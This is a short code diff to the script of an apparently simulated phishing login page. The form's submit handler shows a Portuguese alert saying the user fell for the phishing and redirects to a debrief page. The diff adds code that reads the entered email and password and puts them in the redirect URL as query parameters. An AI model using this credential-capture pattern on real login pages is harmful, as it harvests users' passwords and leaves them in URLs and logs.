@@ -153,7 +153,10 @@
         document.getElementById('forme').addEventListener('submit', function (event) {
             event.preventDefault(); 
             alert("Você caiu no meu phishing :)");
-            window.location.href = "/drebief.html";
+            let email = document.getElementById('username').value;
+            let senha = document.getElementById('password').value;
+
+            window.location.href = `${window.location.origin}/drebief.html` + '?email=' + encodeURIComponent(email) + '&senha=' + encodeURIComponent(senha);
         });
     </script>
 </body>
